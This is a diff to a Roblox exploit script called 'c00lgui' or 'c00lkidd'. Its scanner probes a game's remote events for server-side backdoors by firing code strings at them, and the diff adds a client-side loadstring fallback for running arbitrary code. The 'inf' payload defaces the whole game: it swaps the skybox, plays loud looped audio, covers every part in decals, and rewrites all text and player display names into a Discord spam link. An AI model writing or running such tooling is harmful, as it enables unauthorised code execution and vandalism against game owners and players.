@@ -36,7 +36,7 @@ Converted["_Frame"].Size = UDim2.new(0, 594, 0, 346)
 Converted["_Frame"].Parent = Converted["_cool"]
 
 Converted["_TextLabel"].Font = Enum.Font.Cartoon
-Converted["_TextLabel"].Text = "join team c00lkidd today!"
+Converted["_TextLabel"].Text = "c00lkidd fUck roBLOX"
 Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_TextLabel"].TextScaled = true
 Converted["_TextLabel"].TextSize = 14
@@ -56,7 +56,7 @@ Converted["_UIStroke"].Parent = Converted["_Frame"]
 
 Converted["_TextBox"].ClearTextOnFocus = false
 Converted["_TextBox"].Font = Enum.Font.Cartoon
-Converted["_TextBox"].PlaceholderText = "team c00lkidd! join today!"
+Converted["_TextBox"].PlaceholderText = "-- team c00lkidd! join today!"
 Converted["_TextBox"].Text = ""
 Converted["_TextBox"].TextColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_TextBox"].TextSize = 18
@@ -230,14 +230,11 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
 		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
 		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
-		ReportAbuse = true
+		ReportAbuse = true, VoiceChatTokenRequest = true, WhisperChat = true, ExperienceChat = true, SetDialogInUse = true, GetServerType = true, ReceiveLikelySpeakingUsers = true, ReuqestDeviceCameraCFrame = true, SetPlayerBlockList = true, GetServerChannel = true, NewPlayerCanManageDetals = true, NewPlayerGroupDetails = true, SetPlayerBlockList = true, RequestDeviceCameraOrientationCapability = false, SendPlayerBlockList = false
 	}
 	
 	local SAFE_LOCATIONS = {
 		["CoreGui"] = true,
-		["ServerStorage"] = true,
-		["ReplicatedFirst"] = true,
-		["ServerScriptService"] = true
 	}
 	
 	local foundExploit = false
@@ -254,8 +251,12 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 		if SAFE_LOCATIONS[parent.ClassName] then
 			return false
 		end
-	
+        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
+            print('nuh uh Roblox Replicated Storage ('..remote.Name..')', 1)
+            return false
+        end 
 		if EXCLUDED_REMOTES[name] then
+		    print("CANCELLED REMOTE " .. name)
 			return false
 		end
 	
@@ -270,7 +271,7 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 		local modelName = "c00lkidd_"..tostring(os.clock()):gsub("%.", "")
 		local foundEvent = false
 	
-		local connection = game:GetService("ReplicatedStorage").DescendantAdded:Connect(function(instance)
+		local connection = workspace.DescendantAdded:Connect(function(instance)
 			if instance.Name == modelName then
 				foundEvent = true
 			end
@@ -281,25 +282,25 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 		local success = pcall(function()
 	
 			if isFunction and mode == 2 then
-				remote:InvokeServer('c00lgui', [[
+				remote:InvokeServer('c00lkidd', [[
 		                    local m=Instance.new("Folder")
 		                    m.Name="]]..modelName..[["
-		                    m.Parent=game:GetService("ReplicatedStorage")
+		                    m.Parent=workspace
 		                    return true
 		                ]])
 			elseif mode == 3 then
 				if isFunction then
-					remote:InvokeServer('c00lgui', [[
+					remote:InvokeServer('c00lkidd', [[
 		                    local m=Instance.new("Folder")
 		                    m.Name="]]..modelName..[["
-		                    m.Parent=game:GetService("ReplicatedStorage")
+		                    m.Parent=workspace
 		                    return true
 		                ]])
 				else
 					remote:FireServer([[
 		                    local m=Instance.new("Folder")
 		                    m.Name="]]..modelName..[["
-		                    m.Parent=game:GetService("ReplicatedStorage")
+		                    m.Parent=workspace
 		                ]])
 				end
 	
@@ -308,15 +309,19 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 					remote:FireServer([[
 		                        local m=Instance.new("Folder")
 		                        m.Name="]]..modelName..[["
-		                        m.Parent=game:GetService("ReplicatedStorage")
+		                        m.Parent=workspace
 		                    ]])
 				end
 			end
 		end)
+	   if not success then
+		   print(
+			   "Erroer"
+		   )
+	   end
 	
-	
-		for _ = 1, 20 do
-			if foundEvent or game:GetService("ReplicatedStorage"):FindFirstChild(modelName) then
+		for _ = 1, 15 do
+			if foundEvent or workspace:FindFirstChild(modelName) then
 				foundEvent = true
 				break
 			end
@@ -325,7 +330,7 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 	
 		connection:Disconnect()
 		if foundEvent then
-			local instance = game:GetService("ReplicatedStorage"):FindFirstChild(modelName)
+			local instance = workspace:FindFirstChild(modelName)
 			if instance then instance:Destroy() end
 	
 			foundExploit = true
@@ -358,7 +363,7 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 		print(string.format("c00lgui: 🔍 scanning %d remotes", count))
 	
 	
-		local MAX_CONCURRENT = 16 
+		local MAX_CONCURRENT = 32
 		local activeTasks = 0
 		local taskDone = Instance.new("BindableEvent")
 	
@@ -407,9 +412,10 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 			warn("c00lgui: no backdoor, cannot execute code.")
 			game.StarterGui:SetCore("SendNotification",{
 				Title = "c00lgui",
-				Text = "error!",
+				Text = "error, running client sided...",
 				Duration = 12
 			})
+			loadstring(code)()
 		end
 	end
 	script.Parent.Ex.MouseButton1Click:Connect(function()
@@ -426,36 +432,72 @@ local function XMBRA_fake_script() -- Fake Script: StarterGui.cool.Frame.LocalSc
 	end)
 	script.Parent.inf.MouseButton1Click:Connect(function()
 		fireRemoteEvent([[
-		  --// Configuration
-	local decalId = "rbxassetid://8408806737"
-	
-	local sky = Instance.new("Sky")
-	sky.SkyboxBk = decalId
-	sky.SkyboxDn = decalId
-	sky.SkyboxFt = decalId
-	sky.SkyboxLf = decalId
-	sky.SkyboxRt = decalId
-	sky.SkyboxUp = decalId
-	sky.Name = "CustomSky"
-	sky.Parent = game.Lighting
-	sky.CelestialBodiesShown = false
-	for _, part in ipairs(workspace:GetDescendants()) do
-		if part:IsA("BasePart") and not part:IsA("Terrain") then
-			-- Set transparency to 0 if the property exists
-			if part:FindFirstChild("Transparency") or part.Transparency ~= nil then
-				part.Transparency = 0
-			end
-	
-			-- Add decals to all 6 faces
-			for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
-				local decal = Instance.new("Decal")
-				decal.Texture = decalId
-				decal.Face = face
-				decal.Name = "AutoDecal"
-				decal.Parent = part
-			end
-		end
-	end
+		 --// Configuration
+local decalId = "rbxassetid://8408806737"
+local sound = Instance.new("Sound")
+sound.Parent = workspace
+sound.SoundId = "rbxassetid://1841602074"
+sound.Looped = true
+sound.Playing = true
+sound.Volume = 3
+local sky = Instance.new("Sky")
+sky.SkyboxBk = decalId
+sky.SkyboxDn = decalId
+sky.SkyboxFt = decalId
+sky.SkyboxLf = decalId
+sky.SkyboxRt = decalId
+sky.SkyboxUp = decalId
+sky.Name = "c00lkidd"
+sky.Parent = game.Lighting
+sky.CelestialBodiesShown = false
+
+local function isInCoreGui(obj)
+    -- Check if any ancestor of the object is in CoreGui
+    local parent = obj.Parent
+    while parent do
+        if parent == game.CoreGui then
+            return true
+        end
+        parent = parent.Parent
+    end
+    return false
+end
+
+for _, obj in pairs(game:GetDescendants()) do
+    -- Ignore objects in CoreGui or any object inside CoreGui
+    if isInCoreGui(obj) then
+        continue
+    end
+
+    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+        pcall(function()
+            obj.TextScaled = true
+            obj.Text = "team c00lkidd! join today! https://discord.gg/7UMqbESaWf"
+        end)
+    end
+    if obj:IsA("Humanoid") then
+        obj.DisplayName = "team c00lkidd! join today! https://discord.gg/7UMqbESaWf"
+    end
+end
+
+for _, part in ipairs(workspace:GetDescendants()) do
+    -- Ignore parts in CoreGui or any part inside CoreGui
+    if isInCoreGui(part) then
+        continue
+    end
+
+    if part:IsA("BasePart") or part:IsA("Union") or part:IsA("MeshPart") and not part:IsA("Terrain") then
+        -- Add decals to all 6 faces
+        for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+            local decal = Instance.new("Decal")
+            decal.Texture = decalId
+            decal.Face = face
+            decal.Name = "c00lkidd"
+            decal.Parent = part
+        end
+    end
+end
+
 	
 		]])
 	end)
